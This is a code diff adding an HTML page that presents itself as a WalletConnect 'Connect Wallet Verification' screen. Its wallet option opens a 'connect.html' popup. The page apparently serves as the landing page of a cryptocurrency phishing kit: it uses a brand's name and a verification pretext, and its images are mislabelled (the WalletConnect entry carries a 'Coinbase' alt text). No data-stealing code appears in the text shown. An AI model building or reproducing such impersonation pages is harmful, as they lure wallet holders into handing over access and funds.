@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>WalletConnect</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background-color: #fff;
+    }
+
+    /* Top Navigation Bar */
+    .navbar {
+      display: flex;
+      align-items: center;
+      height: 70px;
+      padding: 0 20px;
+      background-color: #ffffff;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+    }
+
+    .navbar img {
+      height: 32px;
+    }
+
+    /* Main Content Area */
+    .main {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: calc(100vh - 70px);
+    }
+
+    .container {
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 26px;
+      margin-bottom: 10px;
+      font-weight: 700;
+    }
+
+    p {
+      color: gray;
+      margin-bottom: 20px;
+      font-size: 15px;
+    }
+
+    .wallet-box {
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      width: 350px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+      overflow: hidden;
+      margin-top: 10px;
+    }
+
+    .wallet-option {
+      padding: 20px;
+      cursor: pointer;
+      border-top: 1px solid #eee;
+      transition: background-color 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .wallet-option:hover {
+      background-color: #f5f5f5;
+    }
+
+    .wallet-option:first-child {
+      border-top: none;
+    }
+
+    .wallet-option img {
+      width: 24px;
+      height: 24px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Navigation Bar -->
+  <div class="navbar">
+    <img src="log.png" alt="Connect Logo" />
+  </div>
+
+  <!-- Main Content -->
+  <div class="main">
+    <div class="container">
+      <h1>Connect Wallet Verification</h1>
+      <p>Connect a wallet to continue on</p>
+
+      <div class="wallet-box">
+        <div class="wallet-option" onclick="window.open('connect.html', '_blank', 'width=400,height=600')">
+          <img src="cm.webp" alt="Coinbase" />
+          <strong>WalletConnect</strong>
+        </div>
+        <div class="wallet-option">
+          <img src="xa.jpg" alt="Hardware Wallet" />
+          <strong>Hardware Wallet</strong>
+        </div>
+        <div class="wallet-option" style="text-align: center; font-weight: 500; color: gray;">
+          Show more options
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
